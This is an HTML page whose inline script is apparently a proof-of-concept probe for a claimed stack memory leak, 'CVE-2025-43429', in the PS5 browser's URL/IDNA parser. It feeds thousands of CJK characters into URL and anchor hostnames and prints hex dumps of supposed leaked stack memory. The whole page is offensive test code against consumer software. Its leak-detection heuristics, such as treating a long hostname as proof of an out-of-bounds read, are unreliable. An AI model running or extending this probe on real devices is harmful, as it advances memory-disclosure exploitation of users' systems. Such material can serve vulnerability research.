<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 CVE-2025-43429 - URL IDNA Stack Leak</title>
</head>
<body>
<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
<script>
const L = s => { document.getElementById('log').textContent += s + '\n'; };

L('[*] Starting CVE-2025-43429 URL IDNA Stack Leak test...');

// CJK characters (\u4E00-\u9FFF) expand massively in Punycode.
// 2048 CJK chars -> ~3500+ ASCII Punycode chars.
// The input length is 2048 (passes the guard), but the output exceeds the 2048 buffer.
// This causes an OOB read on the stack.

const sizes = [100, 500, 1000, 1500, 2000, 2048, 3000, 4000];

for (const size of sizes) {
    try {
        // Use a mix of CJK characters to ensure expansion
        let domain = '';
        for (let i = 0; i < size; i++) {
            domain += String.fromCharCode(0x4E00 + (i % 100));
        }
        domain += '.com';
        
        let url = new URL('http://' + domain);
        
        // If we reach here, the parser accepted it.
        // If the hostname length is > 2048, we definitely triggered the OOB read.
        L('[+] Size ' + size + ': URL parsed. Hostname length: ' + url.hostname.length);
        
        // Check for non-Punycode garbage in the hostname
        // Valid Punycode is xn--[a-z0-9-]+
        // If we see non-ASCII or weird characters, it's leaked stack memory
        let hn = url.hostname;
        let anomalies = 0;
        let hexDump = [];
        
        for (let i = 0; i < hn.length; i++) {
            let code = hn.charCodeAt(i);
            hexDump.push(code.toString(16).padStart(2, '0'));
            
            // Look for bytes > 0x7F (not ASCII) or control chars
            if (code > 127 || (code < 32 && code !== 45 && code !== 46)) {
                anomalies++;
            }
        }
        
        if (anomalies > 0) {
            L('[!] ANOMALY DETECTED! Found ' + anomalies + ' non-ASCII chars in hostname!');
            L('[!] THIS IS A STACK LEAK!');
            L('[!] Hex dump (first 200 chars): ' + hexDump.slice(0, 200).join(' '));
        } else if (hn.length > 2048) {
            L('[!] HOSTNAME LENGTH > 2048! OOB read confirmed.');
            L('[!] Hex dump (last 100 chars): ' + hexDump.slice(-100).join(' '));
        }
        
    } catch (e) {
        if (e.message.includes('cannot be parsed')) {
            L('[-] Size ' + size + ': Rejected by URL parser');
        } else {
            L('[!] Size ' + size + ': ERROR: ' + e.message);
        }
    }
}

// Test with anchor element (different code path)
L('\n--- Testing via Anchor element ---');
try {
    const a = document.createElement('a');
    let domain = '';
    for (let i = 0; i < 2048; i++) {
        domain += String.fromCharCode(0x4E00 + (i % 100));
    }
    a.href = 'http://' + domain + '.com';
    void a.offsetWidth; // Force layout
    
    L('[+] Anchor parsed. Hostname length: ' + a.hostname.length);
    if (a.hostname.length > 2048) {
        L('[!] ANCHOR OOB READ CONFIRMED!');
    }
} catch (e) {
    L('[!] Anchor test threw: ' + e.message);
}

L('\n[*] Test finished.');
</script>
</body>
</html>
